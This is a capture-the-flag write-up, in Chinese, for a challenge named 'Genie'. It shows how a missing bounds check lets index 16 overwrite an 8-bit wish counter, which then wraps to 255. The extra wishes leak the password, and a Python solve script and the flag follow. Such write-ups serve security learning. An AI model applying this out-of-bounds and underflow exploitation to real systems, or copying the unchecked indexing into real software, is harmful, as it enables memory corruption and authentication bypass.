# Genie

## 题目简述

程序随机生成 16 字节密码，正常情况下只允许三次“愿望”。单字节查看功能把用户输入读入 `unsigned char index`，却没有检查索引是否小于 16；结合全局变量的固定布局，可以越界修改 8 位愿望计数器并触发整数下溢。

## 解题过程

关键全局变量按如下顺序定义，编译参数还使用 `-fno-toplevel-reorder` 保持顶层对象顺序：

```c
char password_original[16] = {1};
char password[16] = {1};
unsigned char wishes_remaining = 3;
```

单字节愿望执行：

```c
scanf("%hhu", &index);
printf("password[%d] = '%c'\n", index, password[index]);
password[index] = '\0';
wishes_remaining--;
```

因此第一次选择索引 16 时，`password[16]` 正好落在 `wishes_remaining`：程序先泄露其当前值，再写入零，函数末尾执行 `0 - 1`，无符号 8 位计数器回绕成 255。之后便有足够次数读取索引 0 到 15：

```python
def wish(io, index):
    io.sendlineafter(b"choice", b"1")
    io.sendlineafter(b": ", b"1")
    io.sendlineafter(b": ", str(index).encode())
    io.recvuntil(b" = '")
    return io.recvuntil(b"'\n")[:-2]

wish(io, 16)  # 3 -> 0 -> 255
password = b"".join(wish(io, i) for i in range(16))

io.sendlineafter(b"choice", b"2")
io.sendafter(b": ", password)
```

查看功能会清零工作副本 `password`，而最终比较使用未修改的 `password_original`，所以收集到的 16 字节仍能通过认证。本地运行官方服务二进制后得到 `grey{https://imgur.com/QT4jjff}`；其中 URL 是 flag 内容的一部分，不是本 WP 的外部资料依赖。

## 方法总结

本题把两个常见问题串在一起：缺少数组边界检查造成越界读写，8 位无符号计数器再把零递减为 255。分析全局对象相对布局时还要核对编译参数，不能假设编译器永远保持源码顺序。最终 flag 为 `grey{https://imgur.com/QT4jjff}`。
